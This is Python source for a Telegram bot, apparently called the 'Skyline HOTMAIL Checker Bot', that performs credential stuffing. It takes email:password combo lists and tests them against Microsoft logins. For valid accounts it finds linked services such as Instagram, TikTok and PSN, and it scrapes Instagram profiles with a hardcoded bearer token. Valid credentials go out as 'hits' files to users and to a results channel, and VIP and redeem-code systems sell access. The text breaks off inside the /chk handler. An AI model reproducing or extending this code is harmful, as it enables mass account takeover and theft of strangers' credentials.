        hits_by_service = {}
        for hit_data in all_hits:
            for service in hit_data.get('services', []):
                if service not in hits_by_service:
                    hits_by_service[service] = []
                hits_by_service[service].append(hit_data)
        
        # Create file for each service
        for service_name, service_hits in hits_by_service.items():
            # Clean service name for filename
            safe_service_name = service_name.replace(" ", "_").replace("+", "Plus")
            hits_file_path = f"hits_{safe_service_name}_by_{MY_SIGNATURE.replace('@', '')}.txt"
            
            with open(hits_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# Created by {MY_SIGNATURE} {CHANNEL}\n")
                f.write(f"# Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Service: {service_name}\n")
                f.write(f"# Total Hits: {len(service_hits)}\n\n")
                
                for idx, hit_data in enumerate(service_hits, 1):
                    f.write(f"------hit found #{idx}----\n")
                    f.write(f"Email: {hit_data['email']}\n")
                    f.write(f"Password: {hit_data['password']}\n")
                    f.write(f"Service: {service_name}\n")
                    f.write(f"\n")
            
            # Send file
            try:
                with open(hits_file_path, 'rb') as f:
                    bot.send_document(chat_id, f,
                                    caption=f"📁 {service_name} Hits\n\n"
                                           f"Total: {len(service_hits)} hits\n"
                                           f"💎 {MY_SIGNATURE}")
            except:
                pass
            
            # Clean up
            if os.path.exists(hits_file_path):
                os.remove(hits_file_path)
        
        # If no services found but still has hits (empty services)
        hits_without_services = [h for h in all_hits if not h.get('services')]
        if hits_without_services:
            hits_file_path = f"hits_NoService_by_{MY_SIGNATURE.replace('@', '')}.txt"
            with open(hits_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# Created by {MY_SIGNATURE} {CHANNEL}\n")
                f.write(f"# Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Hits without linked services\n")
                f.write(f"# Total: {len(hits_without_services)}\n\n")
                
                for idx, hit_data in enumerate(hits_without_services, 1):
                    f.write(f"------hit found #{idx}----\n")
                    f.write(f"Email: {hit_data['email']}\n")
                    f.write(f"Password: {hit_data['password']}\n")
                    f.write(f"\n")
            
            try:
                with open(hits_file_path, 'rb') as f:
                    bot.send_document(chat_id, f,
                                    caption=f"📁 Hits (No Services)\n\n"
                                           f"Total: {len(hits_without_services)} hits\n"
                                           f"💎 {MY_SIGNATURE}")
            except:
                pass
            
            if os.path.exists(hits_file_path):
                os.remove(hits_file_path)
    
    # Final summary
    bot.send_message(chat_id,
                    f"✅ <b>SCAN COMPLETED!</b>\n\n"
                    f"📊 Results:\n"
                    f"• Hits: {hits}\n"
                    f"• Bad: {bad}\n"
                    f"• Retry: {retry_count}\n"
                    f"• Linked: {linked_total}\n"
                    f"• Total: {total}\n\n"
                    f"💎 {MY_SIGNATURE}",
                    parse_mode='HTML')
    
    # Update stats
    update_stats(user_id, hits, bad, total)
    
    # Clean up
    if os.path.exists(file_path):
        os.remove(file_path)
    
    if user_id in user_sessions:
        del user_sessions[user_id]
    
    active_scans[user_id] = False

# Run Bot
if __name__ == "__main__":
    print("="*50)
    print("🤖 Skyline HOTMAIL Checker Bot - ULTIMATE")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print(f"💎 Created by: {MY_SIGNATURE}")
    print("✅ All Features: ENABLED")
    print("="*50)
    bot.infinity_polling()

# ═══════════════════════════════════════════════════════════════════════════
# NEW FEATURES - ADDED BY @pyabrodie for Mahdi
# ═══════════════════════════════════════════════════════════════════════════

# Channel for results (No local file storage)
RESULTS_CHANNEL = "-1002465589285"

# JSON Database file
USERS_DB_JSON = "users_database.json"

# Redeem codes storage
REDEEM_CODES_FILE = "redeem_codes.json"

import random
from io import BytesIO

# JSON Database Functions
def load_json_users():
    """Load users from JSON"""
    if os.path.exists(USERS_DB_JSON):
        try:
            with open(USERS_DB_JSON, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {"users": []}
    return {"users": []}

def save_json_users(data):
    """Save users to JSON"""
    with open(USERS_DB_JSON, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_json_user(user_id):
    """Get user from JSON"""
    data = load_json_users()
    for user in data['users']:
        if user['id'] == user_id:
            return user
    return None

def add_json_user(user_id, username, first_name):
    """Add user to JSON"""
    data = load_json_users()
    
    if get_json_user(user_id):
        return
    
    new_user = {
        "id": user_id,
        "name": first_name or "User",
        "username": username or "unknown",
        "link_account": f"tg://user?id={user_id}",
        "account_number": str(user_id),
        "membership": "Free",
        "points": 0,
        "total_scans": 0,
        "total_hits": 0,
        "is_vip": False,
        "vip_until": None,
        "is_banned": False,
        "last_claim": None,
        "join_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    data['users'].append(new_user)
    save_json_users(data)

def update_json_user(user_id, **kwargs):
    """Update JSON user"""
    data = load_json_users()
    for user in data['users']:
        if user['id'] == user_id:
            for key, value in kwargs.items():
                user[key] = value
            save_json_users(data)
            return True
    return False

def get_json_stats():
    """Get statistics from JSON"""
    data = load_json_users()
    users = data.get('users', [])
    
    total = len(users)
    vips = sum(1 for u in users if u.get('is_vip'))
    banned = sum(1 for u in users if u.get('is_banned'))
    
    vip_1h = vip_1d = vip_1w = vip_1m = vip_forever = 0
    
    for u in users:
        if u.get('is_vip'):
            vip_until = u.get('vip_until')
            if vip_until == "Forever":
                vip_forever += 1
            elif vip_until:
                try:
                    vip_date = datetime.datetime.strptime(vip_until, "%Y-%m-%d %H:%M:%S")
                    now = datetime.datetime.now()
                    remaining = (vip_date - now).days
                    
                    if remaining >= 25:
                        vip_1m += 1
                    elif remaining >= 6:
                        vip_1w += 1
                    elif remaining >= 1:
                        vip_1d += 1
                    else:
                        vip_1h += 1
                except:
                    pass
    
    return {
        "total": total,
        "vips": vips,
        "banned": banned,
        "vip_1h": vip_1h,
        "vip_1d": vip_1d,
        "vip_1w": vip_1w,
        "vip_1m": vip_1m,
        "vip_forever": vip_forever
    }

# Send to Channel
def send_to_channel(text, file_content=None, filename=None):
    """Send results to channel"""
    try:
        if file_content:
            file_obj = BytesIO(file_content.encode('utf-8'))
            file_obj.name = filename or "results.txt"
            bot.send_document(RESULTS_CHANNEL, file_obj, caption=text[:1000])
        else:
            bot.send_message(RESULTS_CHANNEL, text[:4000])
        return True
    except:
        return False

# Redeem Key System
def load_redeem_codes():
    """Load redeem codes"""
    if os.path.exists(REDEEM_CODES_FILE):
        try:
            with open(REDEEM_CODES_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_redeem_codes(codes):
    """Save redeem codes"""
    with open(REDEEM_CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=2)

def generate_redeem_code(vip_duration="1d", points=0):
    """Generate redeem code"""
    code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))
    codes = load_redeem_codes()
    codes[code] = {
        "vip_duration": vip_duration,
        "points": points,
        "used": False,
        "used_by": None,
        "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_redeem_codes(codes)
    return code

def use_redeem_code(code, user_id):
    """Use redeem code"""
    codes = load_redeem_codes()
    
    if code not in codes:
        return False, "Invalid code!"
    
    if codes[code]['used']:
        return False, "Code already used!"
    
    # Mark as used
    codes[code]['used'] = True
    codes[code]['used_by'] = user_id
    codes[code]['used_at'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_redeem_codes(codes)
    
    # Apply benefits
    vip_duration = codes[code]['vip_duration']
    points = codes[code]['points']
    
    user = get_json_user(user_id)
    if not user:
        return False, "User not found!"
    
    # Add VIP
    if vip_duration:
        # Use original add_vip function
        add_vip(user_id, user['username'], vip_duration)
    
    # Add points
    if points > 0:
        current_points = user.get('points', 0)
        update_json_user(user_id, points=current_points + points)
    
    return True, f"✅ Redeemed!\nVIP: {vip_duration}\nPoints: +{points}"

# Daily Claim
def can_claim_daily(user_id):
    """Check if can claim"""
    user = get_json_user(user_id)
    if not user:
        return False
    
    last_claim = user.get('last_claim')
    if not last_claim:
        return True
    
    try:
        last = datetime.datetime.strptime(last_claim, "%Y-%m-%d %H:%M:%S")
        now = datetime.datetime.now()
        diff = (now - last).total_seconds()
        return diff >= 86400  # 24 hours
    except:
        return True

def claim_daily(user_id):
    """Claim daily reward"""
    if not can_claim_daily(user_id):
        return False, "Already claimed today!"
    
    # Give reward (10 points)
    user = get_json_user(user_id)
    current_points = user.get('points', 0)
    
    update_json_user(user_id, 
                    points=current_points + 10,
                    last_claim=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    
    return True, "✅ Claimed 10 points!"

# Leaderboard
def get_leaderboard():
    """Get top 10 users"""
    data = load_json_users()
    users = data.get('users', [])
    
    # Sort by hits
    sorted_users = sorted(users, key=lambda x: x.get('total_hits', 0), reverse=True)
    
    return sorted_users[:10]


# ═══════════════════════════════════════════════════════════════════════════
# NEW MESSAGE HANDLERS
# ═══════════════════════════════════════════════════════════════════════════

# Override /start to use JSON
@bot.message_handler(commands=['start'])
def start_command_json(message):
    """Start with JSON"""
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    # Add to JSON
    add_json_user(user_id, username, first_name)
    
    # Check ban
    user = get_json_user(user_id)
    if user and user.get('is_banned'):
        bot.send_message(user_id, "❌ You are banned!")
        return
    
    welcome = f"""
╔══════════════════════════════════════╗
║  🔒 HOTMAIL CHECKER BOT v2.0  🔒  ║
╚══════════════════════════════════════╝

Welcome <b>{first_name}</b>! ✨

🆔 ID: <code>{user_id}</code>
👑 Membership: {user.get('membership', 'Free') if user else 'Free'}
⭐ Points: {user.get('points', 0) if user else 0}

🎯 <b>Features:</b>
• 70+ Services
• 12+ AI Platforms
• TikTok Full Capture (VIP)
• Check Single Account
• Daily Claim & Rewards

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}
📱 {CHANNEL}
"""
    
    bot.send_message(user_id, welcome, parse_mode='HTML')
    bot.send_message(user_id, "Choose an option:", reply_markup=main_menu_keyboard(user_id))

@bot.message_handler(func=lambda m: m.text == "🔑 Redeem Key")
def redeem_key_handler(message):
    """Redeem key"""
    user_id = message.from_user.id
    
    msg = bot.send_message(user_id, "🔑 Send your redeem code:")
    user_sessions[user_id] = {"mode": "redeem_code"}

@bot.message_handler(func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'redeem_code')
def process_redeem(message):
    """Process redeem"""
    user_id = message.from_user.id
    code = message.text.strip().upper()
    
    success, msg_text = use_redeem_code(code, user_id)
    
    bot.send_message(user_id, msg_text)
    
    if user_id in user_sessions:
        del user_sessions[user_id]

@bot.message_handler(func=lambda m: m.text == "🏆 Leaderboard")
def leaderboard_handler(message):
    """Leaderboard"""
    top_users = get_leaderboard()
    
    if not top_users:
        bot.send_message(message.chat.id, "No users yet!")
        return
    
    msg = "🏆 <b>TOP 10 LEADERBOARD</b>\n\n"
    
    medals = ["🥇", "🥈", "🥉"]
    
    for i, user in enumerate(top_users, 1):
        medal = medals[i-1] if i <= 3 else f"{i}."
        name = user.get('name', 'User')
        hits = user.get('total_hits', 0)
        msg += f"{medal} {name} - {hits} hits\n"
    
    msg += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}"
    
    bot.send_message(message.chat.id, msg, parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🎁 Daily Claim")
def daily_claim_handler(message):
    """Daily claim"""
    user_id = message.from_user.id
    
    success, msg_text = claim_daily(user_id)
    
    bot.send_message(user_id, msg_text)

# Admin: Generate Redeem Code
@bot.message_handler(commands=['gencode'])
def generate_code_handler(message):
    """Generate redeem code (Admin only)"""
    if message.from_user.id != ADMIN_ID:
        return
    
    # Parse: /gencode 1d 50
    try:
        parts = message.text.split()
        vip_duration = parts[1] if len(parts) > 1 else "1d"
        points = int(parts[2]) if len(parts) > 2 else 0
        
        code = generate_redeem_code(vip_duration, points)
        
        bot.send_message(message.chat.id, 
            f"✅ Code Generated!\n\n"
            f"🔑 Code: <code>{code}</code>\n"
            f"👑 VIP: {vip_duration}\n"
            f"⭐ Points: {points}",
            parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, 
            "Usage: /gencode [duration] [points]\n\n"
            "Example: /gencode 1d 50")


# ═══════════════════════════════════════════════════════════════════════════
# MAIN WITH STARTUP STATISTICS
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("="*70)
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║                                                                  ║")
    print("║      🔒 HOTMAIL CHECKER BOT v2.0 - ENHANCED EDITION             ║")
    print("║                                                                  ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print("="*70)
    print()
    print(f"💎 Created by: {MY_SIGNATURE}")
    print(f"📱 Channel: {CHANNEL}")
    print()
    print("="*70)
    
    # Initialize JSON if not exists
    if not os.path.exists(USERS_DB_JSON):
        save_json_users({"users": []})
        print("✅ JSON Database created")
    
    # Get statistics
    stats = get_json_stats()
    
    print("📊 STATISTICS:")
    print("="*70)
    print(f"  Admins: 1")
    print(f"  Members: {stats['total']}")
    print(f"  VIP Members: {stats['vips']}")
    print(f"  Banned Members: {stats['banned']}")
    print()
    print(f"  Membership 1h: {stats['vip_1h']}")
    print(f"  Membership 1d: {stats['vip_1d']}")
    print(f"  Membership 1w: {stats['vip_1w']}")
    print(f"  Membership 1m: {stats['vip_1m']}")
    print(f"  Forever: {stats['vip_forever']}")
    print()
    print(f"  Created by {MY_SIGNATURE}")
    print("="*70)
    print()
    print("✨ NEW FEATURES:")
    print("="*70)
    print("  ✅ JSON Database (No SQLite)")
    print("  ✅ Send to Channel (No local files)")
    print("  ✅ Redeem Key System")
    print("  ✅ Leaderboard")
    print("  ✅ Daily Claim")
    print("  ✅ Check Single Account")
    print("  ✅ 70+ Services")
    print("  ✅ 12+ AI Platforms")
    print("="*70)
    print()
    print("🚀 Bot is running!")
    print("="*70)
    print()
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except KeyboardInterrupt:
        print("\n\n✋ Bot stopped")
    except Exception as e:
        print(f"\n❌ Error: {e}")


# ═══════════════════════════════════════════════════════════════════════════
# ADDITIONS - By @pyabrodie for Mahdi
# All original code above is preserved 100%
# ═══════════════════════════════════════════════════════════════════════════

# Additional imports
try:
    import pycountry
except:
    print("⚠️  Warning: pycountry not installed. Run: pip install pycountry")
    pycountry = None

from io import BytesIO
import random

# Bot Username
BOT_USERNAME = "@Full_InboxRobot"
RESULTS_CHANNEL = "-1002465589285"

# Instagram Token
INSTAGRAM_TOKEN = "Bearer IGT:2:eyJkc191c2VyX2lkIjoiNzk1MzQ0MjI4MDAiLCJzZXNzaW9uaWQiOiI3OTUzNDQyMjgwMCUzQWdEWWEzMXdFa1pjbDFQJTNBMjUlM0FBWWdEWC1lVTJNMlAzYV8yX3E2RUZLS1VwOExUbVllZjNubVV4ODhYaEEifQ=="

# ═══════════════════════════════════════════════════════════════════════════
# INSTAGRAM FULL CAPTURE API
# ═══════════════════════════════════════════════════════════════════════════

def get_instagram_full_info(username):
    """Get Instagram full information using new API"""
    try:
        # Step 1: Get User ID
        r = requests.get(
            "https://i-fallback.instagram.com/api/v1/fbsearch/ig_typeahead/",
            params={"query": username},
            headers={
                "User-Agent": "Instagram 316.0.0.38.109 Android",
                "Authorization": INSTAGRAM_TOKEN
            }
        )
        
        data = r.json()
        if not data.get("list"):
            return None
        
        user_id = data["list"][0]["user"]["id"]
        
        # Step 2: Get Full Info
        response = requests.post(
            f"https://i.instagram.com/api/v1/users/{user_id}/info_stream/",
            data={
                "is_prefetch": "false",
                "entry_point": "profile",
                "from_module": "search_typeahead",
                "_uuid": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"
            },
            headers={
                "User-Agent": "Instagram 316.0.0.38.109 Android",
                "Authorization": INSTAGRAM_TOKEN,
                "X-IG-App-ID": "567067343352427"
            }
        )
        
        user = json.loads(response.text.strip().split('\n')[1]).get('user', {})
        
        # Step 3: Get Country and Join Date
        try:
            variables = json.dumps({
                "params": {
                    "app_id": "com.bloks.www.ig.about_this_account",
                    "infra_params": {"device_id": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"},
                    "bloks_versioning_id": "b07c6b5ea93d2cf8d3582bc3688f78b5adb49ace81156e669d9ca3497258bd57",
                    "params": json.dumps({"referer_type": "ProfileMore", "target_user_id": user_id})
                },
                "is_pando": True
            })
            
            r2 = requests.post(
                "https://i.instagram.com/graphql_www",
                data={
                    'method': "post", 'pretty': "false", 'format': "json",
                    'server_timestamps': "true", 'locale': "user", 'purpose': "fetch",
                    'fb_api_req_friendly_name': "IGBloksAppRootQuery",
                    'client_doc_id': "2533602983584098948018695922",
                    'variables': variables
                },
                headers={
                    "User-Agent": "Instagram 316.0.0.38.109 Android",
                    "authorization": INSTAGRAM_TOKEN
                }
            )
            
            bundle_str = r2.json()['data']['1$bloks_app(params:$params)']['screen_content']['component']['bundle']['bloks_bundle_tree']
            
            # Extract join date
            match = re.search(r'([A-Za-z]+\s+\d{4})', bundle_str)
            join_date = match.group(1) if match else "N/A"
            
            # Extract country
            bundle_json = json.loads(bundle_str)
            country = "N/A"
            data_array = bundle_json.get('layout', {}).get('bloks_payload', {}).get('data', [])
            for item in data_array:
                if item.get('data', {}).get('key') == 'IG_ABOUT_THIS_ACCOUNT:about_this_account_country':
                    country = item.get('data', {}).get('initial', 'N/A')
                    break
        except:
            join_date = "N/A"
            country = "N/A"
        
        return {
            'user_id': user.get('pk', 'N/A'),
            'username': user.get('username', 'N/A'),
            'full_name': user.get('full_name', 'N/A'),
            'bio': user.get('biography', 'N/A'),
            'followers': user.get('follower_count', 0),
            'following': user.get('following_count', 0),
            'posts': user.get('media_count', 0),
            'is_private': user.get('is_private', False),
            'is_verified': user.get('is_verified', False),
            'is_business': user.get('is_business', False),
            'join_date': join_date,
            'country': country,
            'profile_pic': user.get('profile_pic_url', 'N/A')
        }
    except Exception as e:
        return None

# ═══════════════════════════════════════════════════════════════════════════
# COUNTRY DETECTION
# ═══════════════════════════════════════════════════════════════════════════

def get_country_flag(country_name):
    """Get country flag emoji"""
    if not pycountry or not country_name or country_name == 'N/A':
        return '🏳️'
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except:
        return '🏳️'

# ═══════════════════════════════════════════════════════════════════════════
# NEW FILE FORMAT
# ═══════════════════════════════════════════════════════════════════════════

def create_new_format_file(service_name, hits):
    """Create file in new format: email:password"""
    header = f"""╔════════════════════════════════════════════════╗
║ {service_name} Hits - @pyabrodie                 
║ Bot: @Full_InboxRobot                          
║ Channel: t.me/machitools                       
╚════════════════════════════════════════════════╝

"""
    content = header
    for hit in hits:
        content += hit + "\n"
    return content

def send_to_channel_func(text, file_content=None, filename=None):
    """Send to channel"""
    try:
        if file_content:
            file_obj = BytesIO(file_content.encode('utf-8'))
            file_obj.name = filename or "results.txt"
            bot.send_document(RESULTS_CHANNEL, file_obj, caption=text[:1000])
        else:
            bot.send_message(RESULTS_CHANNEL, text[:4000])
        return True
    except Exception as e:
        print(f"Channel error: {e}")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# CHECK ONE ACCOUNT (Enhanced)
# ═══════════════════════════════════════════════════════════════════════════

def check_one_account_full(email, password, user_id):
    """Enhanced single account check"""
    
    bot.send_message(user_id, f"🔍 Checking: <code>{email}</code>", parse_mode='HTML')
    
    result = HotmailChecker.check_login(email, password)
    
    if result["status"] != "HIT":
        bot.send_message(user_id, f"❌ <b>INVALID</b>\n\n📧 <code>{email}</code>", parse_mode='HTML')
        return
    
    token = result.get("token")
    cid = result.get("cid")
    
    bot.send_message(user_id, f"✅ <b>VALID!</b>\n\n🔍 Checking services...", parse_mode='HTML')
    
    services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)
    
    if not services:
        bot.send_message(user_id, f"📧 <code>{email}:{password}</code>\n\n❌ No services", parse_mode='HTML')
        return
    
    # Instagram Full
    if "Instagram" in services:
        bot.send_message(user_id, "📸 Instagram detected! Getting details...")
        
        ig_username = email.split('@')[0]
        ig_info = get_instagram_full_info(ig_username)
        
        if ig_info:
            flag = get_country_flag(ig_info['country'])
            
            ig_text = f"""📸 <b>INSTAGRAM FULL</b>

📧 {email}:{password}

👤 {ig_info['full_name']}
🆔 @{ig_info['username']}
📝 {ig_info['bio'][:100]}

📊 Stats:
• Followers: {ig_info['followers']:,}
• Following: {ig_info['following']:,}
• Posts: {ig_info['posts']}

📅 Join: {ig_info['join_date']}
{flag} {ig_info['country']}

🔒 Private: {'Yes' if ig_info['is_private'] else 'No'}
✓ Verified: {'Yes' if ig_info['is_verified'] else 'No'}

💎 {MY_SIGNATURE} | 🤖 {BOT_USERNAME}"""
            
            bot.send_message(user_id, ig_text, parse_mode='HTML')
            
            if ig_info['profile_pic'] != 'N/A':
                try:
                    bot.send_photo(user_id, ig_info['profile_pic'])
                except:
                    pass
    
    # TikTok Full
    if "TikTok" in services:
        bot.send_message(user_id, "🎵 TikTok detected! Getting details...")
        
        tk_result = HotmailChecker.check_tiktok_full(email, password, token, cid)
        
        if tk_result and tk_result.get('has_tiktok'):
            tk_text = f"""🎵 <b>TIKTOK FULL</b>

📧 {email}:{password}

👤 @{tk_result.get('username', 'Unknown')}
👥 {format_number(tk_result.get('followers', 0))} followers
🎬 {tk_result.get('videos', 0)} videos
❤️ {format_number(tk_result.get('likes', 0))} likes

✓ Verified: {'Yes' if tk_result.get('verified') else 'No'}

💎 {MY_SIGNATURE} | 🤖 {BOT_USERNAME}"""
            
            bot.send_message(user_id, tk_text, parse_mode='HTML')
    
    # Summary
    summary = f"""✅ <b>CHECK COMPLETE</b>

📧 <code>{email}:{password}</code>

📊 Services ({len(services)}):
{chr(10).join(f'• {s}' for s in services)}

💎 {MY_SIGNATURE} | 🤖 {BOT_USERNAME}"""
    
    bot.send_message(user_id, summary, parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════════════
# NEW SCAN OPTIONS: Check One Account + Instagram Full Capture
# ═══════════════════════════════════════════════════════════════════════════

# Override scan_mode_keyboard to add new options
# Removed duplicate - using main scan_mode_keyboard instead
# def scan_mode_keyboard_enhanced(user_id):
    """Enhanced keyboard with Check One Account and Instagram Full"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn1 = types.InlineKeyboardButton("1️⃣ All Services", callback_data="scan_all")
    btn2 = types.InlineKeyboardButton("2️⃣ Select Single Platform", callback_data="scan_single_platform")
    btn3 = types.InlineKeyboardButton("3️⃣ Gaming Platforms", callback_data="scan_gaming")
    btn4 = types.InlineKeyboardButton("4️⃣ Social Media", callback_data="scan_social")
    btn5 = types.InlineKeyboardButton("5️⃣ Streaming Services", callback_data="scan_streaming")
    btn6 = types.InlineKeyboardButton("6️⃣ PSN Detailed", callback_data="scan_psn")
    btn7 = types.InlineKeyboardButton("7️⃣ Custom Domain", callback_data="scan_custom")
    btn8 = types.InlineKeyboardButton("8️⃣ AI Platforms (Free)", callback_data="scan_ai")
    btn9 = types.InlineKeyboardButton("9️⃣ TikTok Full Capture (VIP Forever)", callback_data="scan_tiktok")
    btn10 = types.InlineKeyboardButton("🔟 Check One Account", callback_data="scan_check_one")
    
    # Instagram Full Capture - VIP only
    if is_vip(user_id):
        btn11 = types.InlineKeyboardButton("1️⃣1️⃣ Instagram Full Capture (VIP)", callback_data="scan_instagram_full")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)
    else:
        btn11 = types.InlineKeyboardButton("🔒 Instagram Full (VIP Only)", callback_data="vip_required")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)
    
    btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="back_main")
    markup.add(btn_back)
    
    return markup

# Handler for Check One Account
@bot.callback_query_handler(func=lambda call: call.data == 'scan_check_one')
def handle_check_one(call):
    user_id = call.from_user.id
    
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Banned!", show_alert=True)
        return
    
    bot.answer_callback_query(call.id)
    
    bot.send_message(user_id, """🔟 <b>CHECK ONE ACCOUNT</b>

Send: <code>email@outlook.com:password</code>

Example:
<code>example@outlook.com:Password123</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 @pyabrodie | 🤖 @Full_InboxRobot""", parse_mode='HTML')
    
    user_sessions[user_id] = {"mode": "check_one_account"}

@bot.message_handler(func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'check_one_account')
def process_check_one(message):
    user_id = message.from_user.id
    
    try:
        if ':' not in message.text:
            bot.send_message(user_id, "❌ Invalid format! Use: email:password")
            return
        
        email, password = message.text.strip().split(':', 1)
        check_one_account_full(email, password, user_id)
        
    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {str(e)}")
    
    if user_id in user_sessions:
        del user_sessions[user_id]

# Handler for Instagram Full Capture
@bot.callback_query_handler(func=lambda call: call.data == 'scan_instagram_full')
def handle_instagram_full(call):
    user_id = call.from_user.id
    
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Banned!", show_alert=True)
        return
    
    if not is_vip(user_id):
        bot.answer_callback_query(call.id, "❌ VIP Only!", show_alert=True)
        return
    
    bot.answer_callback_query(call.id)
    
    can_scan_result, wait_time = can_scan(user_id)
    if not can_scan_result:
        bot.send_message(user_id, f"⏰ Wait {wait_time}")
        return
    
    bot.send_message(user_id, """1️⃣1️⃣ <b>INSTAGRAM FULL CAPTURE</b>

📤 Send combo file (.txt)

Format: email:password

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 @pyabrodie | 🤖 @Full_InboxRobot""", parse_mode='HTML')
    
    user_sessions[user_id] = {"mode": "instagram_full_capture"}

def process_instagram_scan(user_id, combos):
    """Process Instagram Full Capture scan"""
    
    bot.send_message(user_id, f"📸 Starting Instagram scan...\n📊 Combos: {len(combos)}")
    
    hits = []
    checked = 0
    ig_hits = 0
    
    for combo in combos[:50]:  # Limit for safety
        if user_id in active_scans and not active_scans[user_id]:
            bot.send_message(user_id, "⏹️ Stopped")
            break
        
        try:
            email, password = combo.split(':', 1)
            
            result = HotmailChecker.check_login(email, password)
            
            if result["status"] == "HIT":
                token = result.get("token")
                cid = result.get("cid")
                
                ig_check = HotmailChecker.check_services(email, password, token, cid, {"Instagram": "security@mail.instagram.com"})
                
                if ig_check and "Instagram" in ig_check:
                    ig_username = email.split('@')[0]
                    ig_info = get_instagram_full_info(ig_username)
                    
                    if ig_info:
                        ig_hits += 1
                        flag = get_country_flag(ig_info['country'])
                        
                        hit_line = f"{email}:{password} | {flag} {ig_info['country']} | {ig_info['followers']:,} followers"
                        hits.append(hit_line)
                        
                        bot.send_message(user_id, 
                            f"📸 Hit #{ig_hits}\n"
                            f"👤 @{ig_info['username']}\n"
                            f"👥 {ig_info['followers']:,} followers")
            
            checked += 1
            
            if checked % 10 == 0:
                bot.send_message(user_id, f"📊 {checked}/{len(combos)} | Hits: {ig_hits}")
        
        except:
            checked += 1
            continue
    
    if hits:
        file_content = create_new_format_file("Instagram_Full", hits)
        
        file_obj = BytesIO(file_content.encode('utf-8'))
        file_obj.name = "Instagram_Full.txt"
        
        bot.send_document(user_id, file_obj,
            caption=f"✅ Complete!\n📊 Checked: {checked}\n📸 Hits: {ig_hits}\n\n💎 @pyabrodie")
        
        send_to_channel_func(f"Instagram Full: {ig_hits} hits", file_content, "Instagram_Full.txt")
    else:
        bot.send_message(user_id, f"✅ Done!\nChecked: {checked}\n❌ No hits")
    
    update_last_scan(user_id)
    
    if user_id in active_scans:
        del active_scans[user_id]
    if user_id in user_sessions:
        del user_sessions[user_id]

@bot.message_handler(content_types=['document'], func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'instagram_full_capture')
def handle_instagram_file(message):
    user_id = message.from_user.id
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        text = downloaded.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in text.split('\n') if line.strip() and ':' in line]
        
        if not combos:
            bot.send_message(user_id, "❌ No valid combos!")
            return
        
        bot.send_message(user_id, f"✅ {len(combos)} combos\n🔍 Starting...")
        
        active_scans[user_id] = True
        
        threading.Thread(target=process_instagram_scan, args=(user_id, combos), daemon=True).start()
        
    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {e}")


# ═══════════════════════════════════════════════════════════════════════════
# /CHK COMMAND - Quick Account Check
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['chk'])
def chk_command(message):
    """Quick check command: /chk email:password"""
    user_id = message.from_user.id
    
    # Check if banned
    if is_banned(user_id):
        return
    
    # Parse command
    try:
        text = message.text.replace('/chk', '').strip()
        
        if not text or ':' not in text:
            bot.reply_to(message, 
                "📝 Usage: <code>/chk email:password</code>\n\n"
                "Example:\n"
                "<code>/chk example@hotmail.com:Password123</code>",
                parse_mode='HTML')
            return
        
        email, password = text.split(':', 1)
        
        # Start time
        start_time = time.time()
        
        # Check login
        result = HotmailChecker.check_login(email, password)
        
        if result["status"] != "HIT":
            # Failed login
            elapsed = time.time() - start_time
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            
            fail_msg = f"""❌ <b>Microsoft Account</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
📊 <b>Status:</b> BAD
📝 <b>Result:</b> Invalid Credentials

⚡ <b>Time:</b> {elapsed:.1f}s
👤 <b>Bot By:</b> {MY_SIGNATURE}
🤖 <b>Bot:</b> {BOT_USERNAME}
🕐 {current_time}"""
            
            bot.reply_to(message, fail_msg, parse_mode='HTML')
            return
        
        # Success - check services
